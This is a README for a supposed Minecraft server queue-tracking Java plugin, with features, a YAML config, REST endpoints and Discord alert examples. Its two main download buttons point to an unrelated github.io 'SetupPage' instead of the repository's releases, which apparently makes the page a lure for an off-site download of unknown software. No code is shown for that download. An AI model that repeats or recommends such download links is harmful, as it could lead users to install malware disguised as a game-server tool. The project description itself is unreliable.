# Minecraft‑Server‑Queue‑Tracker  
*Real‑time queue monitoring for any Minecraft server*  

[![Version](https://img.shields.io/badge/Version-1.0.0‑blue?style=flat-square)](#)  
[![License](https://img.shields.io/badge/License-MIT‑green?style=flat-square)](https://github.com/gigahokagepincers/Minecraft-Server-Queue-Tracker/blob/main/LICENSE)  
[![Java 17+](https://img.shields.io/badge/Java-17%2B‑orange?style=flat-square)](#)  
[![Discord](https://img.shields.io/discord/123456789012345678?color=7289da&label=Discord&style=flat-square)](https://discord.gg/yourdiscord)  

---  

## 🎮 What is this?

**Minecraft‑Server‑Queue‑Tracker** is a lightweight, plug‑and‑play Java library (or plugin) that watches a Minecraft server’s login queue and provides:

* **Live queue length** – see how many players are waiting in real time.  
* **Dynamic alerts** – push notifications when the queue exceeds a threshold, when the server goes offline, or when a spot opens up.  
* **Configurable tracking** – decide which metrics to log, how often to poll, and which channels (webhook, console, Discord, etc.) receive updates.  
* **Zero‑impact design** – runs on a separate thread, leaving the server’s performance untouched.

Perfect for community servers, large survival realms, or any admin who wants to keep players informed before they even join.  

---  

## ✨ Key Features  

| Feature | Description |
|---------|-------------|
| **Live Stats Dashboard** | REST endpoint (`/queue`) returns JSON with current queue size, average wait time, and server status. |
| **Alert System** | Configurable thresholds → Discord webhook, email, or in‑game broadcast. |
| **Multi‑Server Support** | Track several servers from a single instance; each server has its own profile. |
| **Persisted History** | SQLite (or optional MySQL) stores past queue data for trend analysis. |
| **Customizable Poll Rate** | Choose a polling interval from 1 s to 5 min. |
| **Lightweight** | < 2 MB JAR, no heavy dependencies. |
| **Open‑source** | Fully documented, MIT‑licensed, ready for contributions. |

---  

## 📦 Installation  

1. **Download** the latest release from the Release page:  

   <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Download‑Release‑brightgreen?style=for-the-badge&logo=download" alt="Download"></a>  

2. Place the JAR in your server’s `plugins/` folder (for Spigot/Paper) **or** add it to your Java project’s classpath.  

3. Restart the server (or run your Java application).  

4. A default `config.yml` will be created in `plugins/QueueTracker/`. Edit it to suit your environment (see **Configuration** below).  

---  

## ⚙️ Configuration  

`config.yml` (generated on first run)

```yaml
# Global settings
poll-interval-seconds: 10          # How often to query the server
max-queue-threshold: 30             # Trigger alert when queue >= this number
alert-webhook:
  enabled: true
  url: "https://discord.com/api/webhooks/..."
  mention: "@here"
store-history: true
database:
  type: "sqlite"                   # or "mysql"
  file: "queue_tracker.db"
  host: "localhost"
  port: 3306
  user: "tracker"
  password: "secret"
servers:
  - name: "SurvivalRealm"
    address: "play.survivalrealm.net"
    port: 25565
  - name: "CreativeHub"
    address: "creative.hub.net"
    port: 25565
```

*Change only the fields you need; every option is commented in the file.*  

---  

## 📊 Using the REST API  

| Endpoint | Method | Returns |
|----------|--------|---------|
| `/queue` | `GET` | `{ "server": "SurvivalRealm", "size": 12, "avg_wait_seconds": 8 }` |
| `/servers` | `GET` | List of tracked servers and their statuses |
| `/history?server=SurvivalRealm&days=7` | `GET` | JSON array of historic queue lengths for the past week |

All responses are **CORS‑enabled** for easy integration with web dashboards.  

---  

## 🔔 Alert Workflow  

1. Tracker polls the server.  
2. If `queueSize >= max-queue-threshold` → **Alert** is dispatched.  
3. Alert payload (Discord example):  

```json
{
  "content": "@here Queue alert! **SurvivalRealm** has **32** players waiting.",
  "embeds": [
    {
      "title": "Server Status",
      "description": "Online – 32/100 slots filled",
      "color": 16711680
    }
  ]
}
```

You can replace the webhook with an email SMTP block, a Slack webhook, or a custom Java listener.  

---  

## 🧪 Development & Contributing  

1. **Clone** the repo  

   ```bash
   git clone https://github.com/gigahokagepincers/Minecraft-Server-Queue-Tracker.git
   cd Minecraft-Server-Queue-Tracker
   `````  

2. **Build** with Maven  

   ```bash
   mvn clean package
   ```  

3. The compiled JAR appears in `target/QueueTracker-1.0.0.jar`.  

4. **Submit PRs** – we welcome bug fixes, new alert integrations, and UI enhancements. Please follow the standard GitHub flow and keep the code style consistent with the existing files.  

---  

## 📜 License  

This project is licensed under the **MIT License** – see the [LICENSE](https://github.com/gigahokagepincers/Minecraft-Server-Queue-Tracker/blob/main/LICENSE) file for details.  

---  

## 🙏 Acknowledgements  

* Inspired by community feedback on large survival servers.  
* Thanks to the Spigot and Paper communities for their excellent APIs.  

---  

### 🚀 Ready to get started?

<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/🚀%20Start%20Now‑Release‑ff7f50?style=for-the-badge&logo=github" alt="Start Now"></a>   <a href="https://github.com/gigahokagepincers/Minecraft-Server-Queue-Tracker/issues"><img src="https://img.shields.io/badge/🐞%20Report%20Issue‑GitHub‑ff69b4?style=for-the-badge&logo=github" alt="Report Issue"></a>   <a href="https://github.com/gigahokagepincers/Minecraft-Server-Queue-Tracker/wiki"><img src="https://img.shields.io/badge/📚%20Wiki‑Documentation‑4b8bbe?style=for-the-badge&logo=github" alt="Wiki"></a>